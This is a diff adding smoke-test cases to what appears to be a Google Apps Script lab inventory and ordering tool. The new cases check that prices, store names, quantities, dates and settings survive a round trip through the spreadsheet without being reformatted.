       ok("all-digit serial stays a string",  it.serial === "0012345678", it.serial);
@@ -2061,6 +2179,31 @@ function smokeTest() {
       ok("a future booking does not hold the item",  bookingHoldsItem_(c) === false, bookingHoldsItem_(c));
       ok("bookingsClash_ agrees with itself",        bookingsClash_(c, c) === true, false);
     }
+
+    out.push("— an order is mostly free text, and people type prices like people —");
+    appendRow("Orders", {
+      id: SMOKE_ + "-O-1", store: "5/10 Supplies", item: "Cable, 1,000 ct",
+      link: "https://example.com/x?a=1&b=2", qty: 2, unit: "box",
+      price: "$14.99",                      // currency: Sheets keeps 14.99 and drops the $
+      cat: "Compute & Electronics", requestedBy: "Smoke Tester", reason: "",
+      urgency: "Normal", date: "2026-08-20", status: "Pending",
+      requestedByEmail: "smoke@jh.edu",
+    });
+    var o = findRow("Orders", SMOKE_ + "-O-1");
+    ok("the order round-trips at all", !!o, null);
+    if (o) {
+      ok("a price keeps its dollar sign",         o.price === "$14.99", o.price);
+      ok("a store written 5/10 is not a date",    o.store === "5/10 Supplies", o.store);
+      ok("a thousands separator is not stripped", o.item === "Cable, 1,000 ct", o.item);
+      ok("urgency stays the word it was",         o.urgency === "Normal", o.urgency);
+      ok("the date column is still a date",       o.date === "2026-08-20", o.date);
+      ok("qty is still a number",                 o.qty === 2, o.qty);
+    }
+
+    out.push("— settings are read raw, so they have to be written as text —");
+    writeSetting(SMOKE_ + "-ts", "2026-08-20 5:42 PM");
+    ok("a timestamp stays the text that was written",
+       readSettings()[SMOKE_ + "-ts"] === "2026-08-20 5:42 PM", readSettings()[SMOKE_ + "-ts"]);
 
     out.push("— readTable sees what findRow sees —");
     var fromTable = readTable("Items").filter(function (r) { return r.id === SMOKE_ + "-0012"; })[0];
